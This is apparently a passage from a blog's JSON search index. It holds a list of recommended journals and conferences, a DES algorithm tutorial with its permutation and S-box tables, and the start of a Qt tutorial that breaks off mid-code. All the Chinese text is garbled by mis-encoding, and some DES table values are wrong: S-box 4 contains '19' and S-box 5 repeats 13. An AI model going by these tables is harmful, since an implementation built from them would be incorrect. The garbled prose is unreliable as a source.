ä¸­å›½è®¡ç®—æœºå­¦ä¼šã€ä¸­å›½ç§‘å­¦é™¢è½¯ä»¶ç ”ç©¶æ‰€     | [http://www.jos.org.cn](http://www.jos.org.cn/) |\n| 2    | è®¡ç®—æœºå­¦æŠ¥       | ä¸­å›½è®¡ç®—æœºå­¦ä¼šã€ä¸­å›½ç§‘å­¦é™¢è®¡ç®—æŠ€æœ¯ç ”ç©¶æ‰€ | http://cjc.ict.ac.cn/                           |\n| 3    | è®¡ç®—æœºç ”ç©¶ä¸å‘å±• | ä¸­å›½è®¡ç®—æœºå­¦ä¼šã€ä¸­å›½ç§‘å­¦é™¢è®¡ç®—æŠ€æœ¯ç ”ç©¶æ‰€ | http://crad.ict.ac.cn/                          |\n\n### ä¸­å›½å¯†ç å­¦ä¼šCACRæ¨è\n\nåœ°å€ï¼šhttps://www.cacrnet.org.cn/site/content/96.html\n\n#### **æœŸåˆŠ**\n\n![](https://img.jwt1399.top/img/107A4D40-2D00-4292-9EE0-349C056EF592.png)\n\n![](https://img.jwt1399.top/img/37002D10-4240-4487-90B0-3D5A2DA627DD.png)\n\n#### ä¼šè®®\n\n![](https://img.jwt1399.top/img/4D45E864-66D2-423F-8690-B13B2F5D6F91.png)\n\n![](https://img.jwt1399.top/img/EBBF92B3-65F2-43A4-B019-3FB25E1C1A41.png)\n\n###  **ä¸­å›½è®¡ç®—æœºå­¦ä¼šCCFæ¨è**\n\nåœ°å€ï¼šhttps://www.ccf.org.cn/Academic_Evaluation/NIS/\n\n#### æœŸåˆŠ\n\n![](https://img.jwt1399.top/img/F79056AD-3386-4B39-990D-08DA15475ACC.png)\n\n#### ä¼šè®®\n\n![](https://img.jwt1399.top/img/CD4E9DF0-74C9-49F6-87AA-10684F863B4F-5854961.png)\n\n![](https://img.jwt1399.top/img/96F421E8-44BF-4FB3-80C6-0C10A4F687EF.png)\n\n![](https://img.jwt1399.top/img/EF0BD344-947F-420A-B769-A7F0AD03E6FC-5855019.png)\n\n![](https://img.jwt1399.top/img/D95AEAF4-E0D7-4219-8611-5F96862CC992-5855028.png)\n\n## DES\n\n> DES çš„è‹±æ–‡å…¨ç§°æ˜¯ Data Encryption Standardï¼Œæ„æ€æ˜¯æ•°æ®åŠ å¯†æ ‡å‡†ï¼ŒDESæ˜¯ä¸€ä¸ªåˆ†ç»„åŠ å¯†ç®—æ³•ï¼ŒåŠ å¯†å’Œè§£å¯†ç”¨çš„æ˜¯åŒä¸€ä¸ªç®—æ³•ã€‚\n\n- å…¸å‹çš„ DES ä»¥ `64` ä½ä¸ºåˆ†ç»„å¯¹æ•°æ®åŠ å¯†\n\n- å¯†é’¥é•¿ `64` ä½ï¼Œä½†å®é™…ä¸Šåªæœ‰ `56` ä½å‚ä¸ DES è¿ç®—\n  - ç¬¬8ã€16ã€24ã€32ã€40ã€48ã€56ã€64ä½æ˜¯æ ¡éªŒä½ï¼Œä½¿å¾—æ¯ä¸ªå¯†é’¥éƒ½æœ‰å¥‡æ•°ä¸ª1\n- åˆ†ç»„åçš„æ˜æ–‡ç»„å’Œ 56 ä½çš„å¯†é’¥æŒ‰ä½æ›¿ä»£æˆ–äº¤æ¢çš„æ–¹æ³•å½¢æˆå¯†æ–‡ç»„\n\n| ![](https://img.jwt1399.top/img/202208041924050.png) |\n| :--------------------------------------------------: |\n| ![](https://img.jwt1399.top/img/202208041924427.png) |\n\nDES ç®—æ³•çš„æ­¥éª¤ï¼ŒåŒ…æ‹¬ `IPç½®æ¢`ã€`å¯†é’¥ç½®æ¢`ã€`Eæ‰©å±•`ã€`Sç›’ä»£æ›¿`ã€`Pç›’ç½®æ¢`å’Œ`æœ«ç½®æ¢`\n\n\n\n### IPç½®æ¢\n\n> IPç½®æ¢ï¼šå°†è¾“å…¥çš„ 64 ä½æ•°æ®å—æŒ‰ä½é‡æ–°ç»„åˆï¼Œå¹¶æŠŠè¾“å‡ºåˆ†ä¸º L0ã€R0 ä¸¤éƒ¨åˆ†ï¼Œæ¯éƒ¨åˆ†é•¿åº¦ä¸º 32 ä½ã€‚\n\n| 58   | 50   | 42   | 34   | 26   | 18   | 10   | 2    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 60   | 52   | 44   | 36   | 28   | 20   | 12   | 4    |\n| 62   | 54   | 46   | 38   | 30   | 22   | 14   | 6    |\n| 64   | 56   | 48   | 40   | 32   | 24   | 16   | 8    |\n| 57   | 49   | 41   | 33   | 25   | 17   | 9    | 1    |\n| 59   | 51   | 43   | 35   | 27   | 19   | 11   | 3    |\n| 61   | 53   | 45   | 37   | 29   | 21   | 13   | 5    |\n| 63   | 55   | 47   | 39   | 31   | 23   | 15   | 7    |\n\nè¡¨ä¸­çš„æ•°å­—ä»£è¡¨æ–°æ•°æ®ä¸­æ­¤ä½ç½®çš„æ•°æ®åœ¨åŸæ•°æ®ä¸­çš„ä½ç½®ï¼Œå³**åŸæ•°æ®å—çš„ç¬¬58ä½æ”¾åˆ°æ–°æ•°æ®çš„ç¬¬1ä½ï¼Œç¬¬50ä½æ”¾åˆ°ç¬¬2ä½ï¼Œâ€¦â€¦ä¾æ­¤ç±»æ¨ï¼Œç¬¬7ä½æ”¾åˆ°ç¬¬64ä½**ã€‚ç½®æ¢åçš„æ•°æ®åˆ†ä¸º L0 å’Œ R0 ä¸¤éƒ¨åˆ†ï¼ŒL0 ä¸ºæ–°æ•°æ®çš„å·¦32ä½ï¼ŒR0ä¸ºæ–°æ•°æ®çš„å³32ä½ã€‚\n\næ³¨æ„ï¼šä½æ•°æ˜¯ä»å·¦è¾¹å¼€å§‹æ•°çš„ï¼Œæœ€å·¦è¾¹çš„ä½ä¸º1ï¼Œæœ€å³è¾¹çš„ä½ä¸º 64ã€‚\n\n> ä¾‹å­ğŸŒ°\n\n![](https://img.jwt1399.top/img/202208041945844.png)\n\n### å¯†é’¥ç½®æ¢\n\n![](https://img.jwt1399.top/img/202208052020156.png)\n\nä¸è€ƒè™‘æ¯ä¸ªå­—èŠ‚çš„ç¬¬8ä½ï¼ŒDESçš„å¯†é’¥ç”±64ä½å‡è‡³56ä½ï¼Œæ¯ä¸ªå­—èŠ‚çš„ç¬¬8ä½ä½œä¸ºå¥‡å¶æ ¡éªŒä½ã€‚äº§ç”Ÿçš„56ä½å¯†é’¥ç”±ä¸‹è¡¨ç”Ÿæˆï¼ˆæ³¨æ„è¡¨ä¸­æ²¡æœ‰8ï¼Œ16ï¼Œ24ï¼Œ32ï¼Œ40ï¼Œ48ï¼Œ56ï¼Œ64è¿™8ä½ï¼‰ï¼š\n\n| 57   | 49   | 41   | 33   | 25   | 17   | 9    | 1    | 58   | 50   | 42   | 34   | 26   | 18   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 10   | 2    | 59   | 51   | 43   | 35   | 27   | 19   | 11   | 3    | 60   | 52   | 44   | 36   |\n| 63   | 55   | 47   | 39   | 31   | 23   | 15   | 7    | 62   | 54   | 46   | 38   | 30   | 22   |\n| 14   | 6    | 61   | 53   | 45   | 37   | 29   | 21   | 13   | 5    | 28   | 20   | 12   | 4    |\n\nåœ¨DESçš„æ¯ä¸€è½®ä¸­ï¼Œä»56ä½å¯†é’¥äº§ç”Ÿå‡ºä¸åŒçš„48ä½å­å¯†é’¥ï¼Œç¡®å®šè¿™äº›å­å¯†é’¥çš„æ–¹å¼å¦‚ä¸‹ï¼š\n\nã€€ã€€1).å°†56ä½çš„å¯†é’¥åˆ†æˆä¸¤éƒ¨åˆ†ï¼Œæ¯éƒ¨åˆ†28ä½ã€‚\n\nã€€ã€€2).æ ¹æ®è½®æ•°ï¼Œè¿™ä¸¤éƒ¨åˆ†åˆ†åˆ«å¾ªç¯å·¦ç§»1ä½æˆ–2ä½ã€‚æ¯è½®ç§»åŠ¨çš„ä½æ•°å¦‚ä¸‹è¡¨ï¼š\n\n| è½®æ•° | 1    | 2    | 3    | 4    | 5    | 6    | 7    | 8    | 9    | 10   | 11   | 12   | 13   | 14   | 15   | 16   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| ä½æ•° | 1    | 1    | 2    | 2    | 2    | 2    | 2    | 2    | 1    | 2    | 2    | 2    | 2    | 2    | 2    | 1    |\n\nç§»åŠ¨åï¼Œä»56ä½ä¸­é€‰å‡º48ä½ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ—¢ç½®æ¢äº†æ¯ä½çš„é¡ºåºï¼Œåˆé€‰æ‹©äº†å­å¯†é’¥ï¼Œå› æ­¤ç§°ä¸ºå‹ç¼©ç½®æ¢ã€‚å‹ç¼©ç½®æ¢è§„åˆ™å¦‚ä¸‹è¡¨ï¼ˆæ³¨æ„è¡¨ä¸­æ²¡æœ‰9ï¼Œ18ï¼Œ22ï¼Œ25ï¼Œ35ï¼Œ38ï¼Œ43ï¼Œ54è¿™8ä½ï¼‰ï¼š\n\n| 14   | 17   | 11   | 24   | 1    | 5    | 3    | 28   | 15   | 6    | 21   | 10   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 23   | 19   | 12   | 4    | 26   | 8    | 16   | 7    | 27   | 20   | 13   | 2    |\n| 41   | 52   | 31   | 37   | 47   | 55   | 30   | 40   | 51   | 45   | 33   | 48   |\n| 44   | 49   | 39   | 56   | 34   | 53   | 46   | 42   | 50   | 36   | 29   | 32   |\n\nç½®æ¢æ–¹æ³•åŒä¸Šï¼Œæ­¤å¤„çœç•¥ã€‚\n\n### Eæ‰©å±•\n\n> Eæ‰©å±•ç½®æ¢ï¼š å°† IP ç½®æ¢åè·å¾—çš„å³åŠéƒ¨åˆ† R0ï¼ˆ32ä½ï¼‰æ‰©å±•ä¸º 48ä½ (6ä½Ã—8ç»„)ï¼Œè¾¾åˆ°ä¸å¯†é’¥ç›¸åŒé•¿åº¦çš„æ•°æ®ä»¥è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼›æä¾›æ›´é•¿çš„ç»“æœï¼Œåœ¨åç»­çš„æ›¿ä»£è¿ç®—ä¸­å¯ä»¥è¿›è¡Œå‹ç¼©ã€‚\n\n| `32` | 1    | 2    | 3    | 4    | `5`  |\n| ---- | ---- | ---- | ---- | ---- | ---- |\n| `4`  | 5    | 6    | 7    | 8    | `9`  |\n| `8`  | 9    | 10   | 11   | 12   | `13` |\n| `12` | 13   | 14   | 15   | 16   | `17` |\n| `16` | 17   | 18   | 19   | 20   | `21` |\n| `20` | 21   | 22   | 23   | 24   | `25` |\n| `24` | 25   | 26   | 27   | 28   | `29` |\n| `28` | 29   | 30   | 31   | 32   | `1`  |\n\nè¡¨ä¸­çš„æ•°å­—ä»£è¡¨ä½ï¼Œä¸¤åˆ—æ©™è‰²æ•°æ®æ˜¯æ‰©å±•çš„æ•°æ®ï¼Œå¯ä»¥çœ‹å‡ºï¼Œæ‰©å±•çš„æ•°æ®æ˜¯ä»ç›¸é‚»ä¸¤ç»„åˆ†åˆ«å–é è¿‘çš„ä¸€ä½ï¼Œ4ä½å˜ä¸º6ä½ã€‚é è¿‘32ä½çš„ä½ä¸º1ï¼Œé è¿‘1ä½çš„ä½ä¸º32ã€‚è¡¨ä¸­ç¬¬äºŒè¡Œçš„4å–è‡ªä¸Šç»„ä¸­çš„æœ«ä½ï¼Œ9å–è‡ªä¸‹ç»„ä¸­çš„é¦–ä½ã€‚\n\n![](https://img.jwt1399.top/img/202208041945699.png)\n\næ‰©å±•ç½®æ¢ä¹‹åï¼Œå³åŠéƒ¨åˆ†æ•°æ®R0å˜ä¸º 48 ä½ï¼Œä¸å¯†é’¥ç½®æ¢å¾—åˆ°çš„è½®å¯†é’¥è¿›è¡Œå¼‚æˆ–ã€‚\n\n> ä¾‹å­ğŸŒ°\n\n![](https://img.jwt1399.top/img/202208041952440.png)\n\n### Sç›’\n\n> å‹ç¼©åçš„å¯†é’¥ä¸æ‰©å±•åˆ†ç»„å¼‚æˆ–ä»¥åå¾—åˆ°48ä½çš„æ•°æ®ï¼Œå°†è¿™ä¸ªæ•°æ®é€äººSç›’ï¼Œè¿›è¡Œæ›¿ä»£è¿ç®—ã€‚æ›¿ä»£ç”±8ä¸ªä¸åŒçš„Sç›’å®Œæˆï¼Œæ¯ä¸ªSç›’æœ‰6ä½è¾“å…¥4ä½è¾“å‡ºã€‚48ä½è¾“å…¥åˆ†ä¸º8ä¸ª6ä½çš„åˆ†ç»„ï¼Œä¸€ä¸ªåˆ†ç»„å¯¹åº”ä¸€ä¸ªSç›’ï¼Œå¯¹åº”çš„Sç›’å¯¹å„ç»„è¿›è¡Œä»£æ›¿æ“ä½œã€‚\n\nSç›’1\n\n| 14   | 4    | 13   | 1    | 2    | 15   | 11   | 8    | 3    | 10   | 6    | 12   | 5    | 9    | 0    | 7    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 0    | 15   | 7    | 4    | 14   | 2    | 13   | 1    | 10   | 6    | 12   | 11   | 9    | 5    | 3    | 8    |\n| 4    | 1    | 14   | 8    | 13   | 6    | 2    | 11   | 15   | 12   | 9    | 7    | 3    | 10   | 5    | 0    |\n| 15   | 12   | 8    | 2    | 4    | 9    | 1    | 7    | 5    | 11   | 3    | 14   | 10   | 0    | 6    | 13   |\n\nSç›’2\n\n| 15   | 1    | 8    | 14   | 6    | 11   | 3    | 4    | 9    | 7    | 2    | 13   | 12   | 0    | 5    | 10   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 3    | 13   | 4    | 7    | 15   | 2    | 8    | 14   | 12   | 0    | 1    | 10   | 6    | 9    | 11   | 5    |\n| 0    | 14   | 7    | 11   | 10   | 4    | 13   | 1    | 5    | 8    | 12   | 6    | 9    | 3    | 2    | 15   |\n| 13   | 8    | 10   | 1    | 3    | 15   | 4    | 2    | 11   | 6    | 7    | 12   | 0    | 5    | 14   | 9    |\n\nSç›’3\n\n| 10   | 0    | 9    | 14   | 6    | 3    | 15   | 5    | 1    | 13   | 12   | 7    | 11   | 4    | 2    | 8    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 13   | 7    | 0    | 9    | 3    | 4    | 6    | 10   | 2    | 8    | 5    | 14   | 12   | 11   | 15   | 1    |\n| 13   | 6    | 4    | 9    | 8    | 15   | 3    | 0    | 11   | 1    | 2    | 12   | 5    | 10   | 14   | 7    |\n| 1    | 10   | 13   | 0    | 6    | 9    | 8    | 7    | 4    | 15   | 14   | 3    | 11   | 5    | 2    | 12   |\n\nSç›’4\n\n| 7    | 13   | 14   | 3    | 0    | 6    | 9    | 10   | 1    | 2    | 8    | 5    | 11   | 12   | 4    | 15   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 13   | 8    | 11   | 5    | 6    | 15   | 0    | 3    | 4    | 7    | 2    | 12   | 1    | 10   | 14   | 19   |\n| 10   | 6    | 9    | 0    | 12   | 11   | 7    | 13   | 15   | 1    | 3    | 14   | 5    | 2    | 8    | 4    |\n| 3    | 15   | 0    | 6    | 10   | 1    | 13   | 8    | 9    | 4    | 5    | 11   | 12   | 7    | 2    | 14   |\n\nSç›’5\n\n| 2    | 12   | 4    | 1    | 7    | 10   | 11   | 6    | 5    | 8    | 3    | 15   | 13   | 0    | 14   | 9    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 14   | 11   | 2    | 12   | 4    | 7    | 13   | 1    | 5    | 0    | 15   | 13   | 3    | 9    | 8    | 6    |\n| 4    | 2    | 1    | 11   | 10   | 13   | 7    | 8    | 15   | 9    | 12   | 5    | 6    | 3    | 0    | 14   |\n| 11   | 8    | 12   | 7    | 1    | 14   | 2    | 13   | 6    | 15   | 0    | 9    | 10   | 4    | 5    | 3    |\n\nSç›’6\n\n| 12   | 1    | 10   | 15   | 9    | 2    | 6    | 8    | 0    | 13   | 3    | 4    | 14   | 7    | 5    | 11   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 10   | 15   | 4    | 2    | 7    | 12   | 9    | 5    | 6    | 1    | 13   | 14   | 0    | 11   | 3    | 8    |\n| 9    | 14   | 15   | 5    | 2    | 8    | 12   | 3    | 7    | 0    | 4    | 10   | 1    | 13   | 11   | 6    |\n| 4    | 3    | 2    | 12   | 9    | 5    | 15   | 10   | 11   | 14   | 1    | 7    | 6    | 0    | 8    | 13   |\n\nSç›’7\n\n| 4    | 11   | 2    | 14   | 15   | 0    | 8    | 13   | 3    | 12   | 9    | 7    | 5    | 10   | 6    | 1    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 13   | 0    | 11   | 7    | 4    | 9    | 1    | 10   | 14   | 3    | 5    | 12   | 2    | 15   | 8    | 6    |\n| 1    | 4    | 11   | 13   | 12   | 3    | 7    | 14   | 10   | 15   | 6    | 8    | 0    | 5    | 9    | 2    |\n| 6    | 11   | 13   | 8    | 1    | 4    | 10   | 7    | 9    | 5    | 0    | 15   | 14   | 2    | 3    | 12   |\n\nSç›’8\n\n| 13   | 2    | 8    | 4    | 6    | 15   | 11   | 1    | 10   | 9    | 3    | 14   | 5    | 0    | 12   | 7    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 1    | 15   | 13   | 8    | 10   | 3    | 7    | 4    | 12   | 5    | 6    | 11   | 0    | 14   | 9    | 2    |\n| 7    | 11   | 4    | 1    | 9    | 12   | 14   | 2    | 0    | 6    | 10   | 13   | 15   | 3    | 5    | 8    |\n| 2    | 1    | 14   | 7    | 4    | 10   | 8    | 13   | 15   | 12   | 9    | 0    | 3    | 5    | 6    | 11   |\n\n### Pç›’\n\nS ç›’è¾“å‡ºçš„ 32 ä½å†ç»è¿‡ P ç›’è¿›è¡Œç½®æ¢ã€‚\n\n| 16   | 7    | 20   | 21   | 29   | 12   | 28   | 17   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 1    | 15   | 23   | 26   | 5    | 18   | 31   | 10   |\n| 2    | 8    | 24   | 14   | 32   | 27   | 3    | 9    |\n| 19   | 13   | 30   | 6    | 22   | 11   | 4    | 25   |\n\nè¡¨ä¸­çš„æ•°å­—ä»£è¡¨åŸæ•°æ®ä¸­æ­¤ä½ç½®çš„æ•°æ®åœ¨æ–°æ•°æ®ä¸­çš„ä½ç½®ï¼Œå³åŸæ•°æ®å—çš„ç¬¬16ä½æ”¾åˆ°æ–°æ•°æ®çš„ç¬¬1ä½ï¼Œç¬¬7ä½æ”¾åˆ°ç¬¬2ä½ï¼Œâ€¦â€¦ä¾æ­¤ç±»æ¨ï¼Œç¬¬25ä½æ”¾åˆ°ç¬¬32ä½ã€‚\n\n### IP<sup>-1</sup>ç½®æ¢\n\nIP<sup>-1Â </sup>ç½®æ¢æ˜¯ IP ç½®æ¢çš„é€†è¿‡ç¨‹ï¼ŒDES æœ€åä¸€è½®åï¼Œå·¦ã€å³ä¸¤åŠéƒ¨åˆ†å¹¶æœªè¿›è¡Œäº¤æ¢ï¼Œè€Œæ˜¯ä¸¤éƒ¨åˆ†åˆå¹¶å½¢æˆä¸€ä¸ªåˆ†ç»„åšä¸ºæœ«ç½®æ¢çš„è¾“å…¥ã€‚æœ«ç½®æ¢è§„åˆ™å¦‚ä¸‹è¡¨ï¼š\n\n| 40   | 8    | 48   | 16   | 56   | 24   | 64   | 32   |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 39   | 7    | 47   | 15   | 55   | 23   | 63   | 31   |\n| 38   | 6    | 46   | 14   | 54   | 22   | 62   | 30   |\n| 37   | 5    | 45   | 13   | 53   | 21   | 61   | 29   |\n| 36   | 4    | 44   | 12   | 52   | 20   | 60   | 28   |\n| 35   | 3    | 43   | 11   | 51   | 19   | 59   | 27   |\n| 34   | 2    | 42   | 10   | 50   | 18   | 58   | 26   |\n| 33   | 1    | 41   | 9    | 49   | 17   | 57   | 25   |\n\n\n\n\n\n## å‚è€ƒ\n\n[åŸåˆ›\\]å¯†ç å­¦åŸºç¡€ï¼šDESåŠ å¯†ç®—æ³•-å¯†ç åº”ç”¨-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com](https://bbs.pediy.com/thread-253558.htm#msg_header_h1_0)\n\n[DESåŠ å¯†ç®—æ³•ï½œå¯†ç å­¦ï½œä¿¡æ¯å®‰å…¨ - å“”å“©å“”å“© (bilibili.com)](https://www.bilibili.com/read/cv13258932?from=note)\n\n[DESåŠ å¯†ç®—æ³•ï½œå¯†ç å­¦ï½œä¿¡æ¯å®‰å…¨_å“”å“©å“”å“©_bilibili](https://www.bilibili.com/video/BV1KQ4y127AT?from=search&seid=825654170653486270&spm_id_from=333.337.0.0)\n\n[DESç®—æ³•è¯¦è§£ - songoo - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/songwenlong/p/5944139.html)\n\n[DESåŠ å¯†ç®—æ³•è§£æä¸å®ç° - luogi - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/luogi/p/15508933.html)\n\n\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"ğŸ””è¯·è¾“å…¥æ–‡ç« æŸ¥çœ‹ç ï¼Œçœ‹æ›´å¤šå†…å®¹\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·æˆ‘å–ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["å¯†ç å­¦"],"categories":["Crypto"]},{"title":"Qt å­¦ä¹ è®°å½•","url":"/posts/3160.html","content":"\n> Qtæ˜¯ä¸€ä¸ª**è·¨å¹³å°**çš„C++**å›¾å½¢ç”¨æˆ·ç•Œé¢åº”ç”¨ç¨‹åºæ¡†æ¶**ã€‚å®ƒä¸ºåº”ç”¨ç¨‹åºå¼€å‘è€…æä¾›å»ºç«‹è‰ºæœ¯çº§å›¾å½¢ç•Œé¢æ‰€éœ€çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯å®Œå…¨é¢å‘å¯¹è±¡çš„ï¼Œå¾ˆå®¹æ˜“æ‰©å±•ï¼Œå¹¶ä¸”å…è®¸çœŸæ­£çš„ç»„ä»¶ç¼–ç¨‹ã€‚\n\n## Qt åŸºç¡€æ–‡ä»¶\n\n![åˆå§‹é¡¹ç›®](https://img.jwt1399.top//img/20210706171757.png)\n\n### **xxx.pro**\n\n> **.proå°±æ˜¯å·¥ç¨‹æ–‡ä»¶(project)ï¼Œå®ƒæ˜¯qmakeè‡ªåŠ¨ç”Ÿæˆçš„ç”¨äºç”Ÿäº§makefileçš„é…ç½®æ–‡ä»¶**\n\n```c\nQT       += core gui //åŒ…å«çš„æ¨¡å—\n\ngreaterThan(QT_MAJOR_VERSION, 4): QT += widgets //å¤§äºQt4ç‰ˆæœ¬ æ‰åŒ…å«widgetæ¨¡å—\n\nCONFIG += c++11  //ä½¿ç”¨c++11çš„ç‰¹æ€§\n\n\nDEFINES += QT_DEPRECATED_WARNINGS\n\n# å·¥ç¨‹ä¸­åŒ…å«çš„æ–‡ä»¶\nSOURCES += \\   //æºæ–‡ä»¶\n    main.cpp \\\n    widget.cpp\n\nHEADERS += \\   //å¤´æ–‡ä»¶\n    widget.h\n\nFORMS += \\    //è®¾è®¡æ–‡ä»¶\n    widget.ui\n\n# Default rules for deployment.\nqnx: target.path = /tmp/$${TARGET}/bin\nelse: unix:!android: target.path = /opt/$${TARGET}/bin\n!isEmpty(target.path): INSTALLS += target\n```\n\n### **widget.h**\n\n```c\n#ifndef WIDGET_H\n#define WIDGET_H\n\n#include <QWidget> //åŒ…å«å¤´æ–‡ä»¶ QWidget çª—å£ç±»\n\nQT_BEGIN_NAMESPACE\nnamespace Ui { class Widget; }\nQT_END_NAMESPACE\n\nclass Widget : public QWidget\n{\n    Q_OBJECT  //Q_OBJECTå®ï¼Œå…è®¸ç±»ä¸­ä½¿ç”¨ä¿¡å·å’Œæ§½çš„æœºåˆ¶\n\n\npublic:\n    Widget(QWidget *parent = nullptr); //æ„é€ å‡½æ•°\n    ~Widget(); //ææ„å‡½æ•°\n\nprivate:\n    Ui::Widget *ui;\n};\n#endif // WIDGET_H\n```\n\n### main.cpp\n\n```c\n#include \"widget.h\"\n#include <QApplication>\n\n//mainç¨‹åºå…¥å£  argcå‘½ä»¤è¡Œå˜é‡çš„æ•°é‡  argvå‘½ä»¤è¡Œå˜é‡çš„æ•°ç»„\nint main(int argc, char *argv[])\n{\n    QApplication a(argc, argv); //aåº”ç”¨ç¨‹åºå¯¹è±¡ï¼Œåœ¨Qtä¸­ï¼Œåº”ç”¨ç¨‹åºå¯¹è±¡ æœ‰ä¸”ä»…æœ‰ä¸€ä¸ª\n    Widget w; //çª—å£å¯¹è±¡  Widgetçˆ¶ç±»  -> QWidget\n    w.show(); //çª—å£å¯¹è±¡ é»˜è®¤ä¸ä¼šæ˜¾ç¤ºï¼Œå¿…é¡»è¦è°ƒç”¨showæ–¹æ³•æ˜¾ç¤ºçª—å£\n    return a.exec(); //è®©åº”ç”¨ç¨‹åºå¯¹è±¡è¿›å…¥æ¶ˆæ¯å¾ªç¯\n}\n```\n### widget.cpp\n\n```c\n#include \"widget.h\"\n#include \"ui_widget.h\"\n\nWidget::Widget(QWidget *parent)//æ„é€ å‡½æ•°\n    : QWidget(parent)\n    , ui(new Ui::Widget)\n{\n    ui->setupUi(this);\n}\n\nWidget::~Widget() //ææ„å‡½æ•°\n{\n    delete ui;\n}\n```\n\n## ä¿¡å·å’Œæ§½ï¼ˆSignal & Slotï¼‰\n\n> ä¿¡å·å’Œæ§½æ˜¯ Qt çš„æ ¸å¿ƒï¼Œå®ƒè®©ä¸¤ä¸ªäº’ä¸ç›¸å¹²çš„å¯¹è±¡è¿æ¥èµ·æ¥ï¼Œå½“ä¸€ä¸ªå¯¹è±¡çš„çŠ¶æ€æ”¹å˜æ—¶ï¼Œå¯ä»¥é€šçŸ¥å¦ä¸€ä¸ªå¯¹è±¡ã€‚åœ¨Qtä¸­æˆ‘ä»¬éœ€è¦ä½¿ç”¨connectå‡½æ•°è¿›äºŒè€…çš„å…³è”ã€‚\n\n```c\nconnect(* sender, &signal, * receiver, &slot);\n```\n\nå‚æ•°è§£é‡Šï¼š\n\n- senderï¼šä¿¡å·å‘é€è€…\n\n- signalï¼šå‘é€çš„ä¿¡å·ï¼ˆå‡½æ•°åœ°å€ï¼‰\n\n- receiverï¼šä¿¡å·æ¥å—è€…\n\n- slotï¼šå¤„ç†çš„æ§½å‡½æ•°ï¼ˆå‡½æ•°åœ°å€ï¼‰\n\n### ç³»ç»Ÿè‡ªå¸¦çš„ä¿¡å·å’Œæ§½\n\n**ä¾‹å­ï¼šç‚¹å‡»æŒ‰é’®ï¼Œå…³é—­çª—å£**\n\n```c\n//åˆ›å»ºä¸€ä¸ªæŒ‰é’® \nQPushButton * btn = new QPushButton(\"å…³é—­çª—å£\",this);\n//è¿æ¥ä¿¡å·ä¸æ§½\nconnect(btn, &QPushButton::clicked, this, &QWidget::close);\n/*\n\tbtn  \t\t\t\t\t\t-ä¿¡å·å‘é€è€…ï¼ˆè¿™é‡Œæ˜¯æŒ‰é’®ï¼‰\n\t&QPushButton::clicked \t\t-å‘é€çš„ä¿¡å·ï¼ˆè¿™é‡Œæ˜¯ç‚¹å‡»æŒ‰é’®ä¿¡å·ï¼‰\n\tthis \t\t\t\t\t\t-ä¿¡å·æ¥å—è€…ï¼ˆè¿™é‡Œæ˜¯æœ¬çª—å£Widgetï¼‰\n\t&QWidget::close \t\t\t-ä¿¡å·æ¥æ”¶è€…æ”¶åˆ°ä¿¡å·å¹²çš„äº‹ï¼ˆè¿™é‡Œæ˜¯è°ƒç”¨çš„æ˜¯å…³é—­çª—å£çš„å‡½æ•°ï¼‰\n*/\n```\n\n### è‡ªå®šä¹‰ä¿¡å·å’Œæ§½\n\næ¡ˆä¾‹--ä¸‹è¯¾åï¼Œè€å¸ˆè§¦å‘é¥¿äº†ä¿¡å·ï¼Œå­¦ç”Ÿå“åº”ä¿¡å·ï¼Œè¯·å®¢åƒé¥­\n\n```c\né¦–å…ˆå®šä¹‰ä¸€ä¸ªå­¦ç”Ÿç±»å’Œè€å¸ˆç±»ï¼š\n\tè€å¸ˆç±»ä¸­å£°æ˜ä¿¡å· é¥¿äº† hungry\nsignals:\n       void 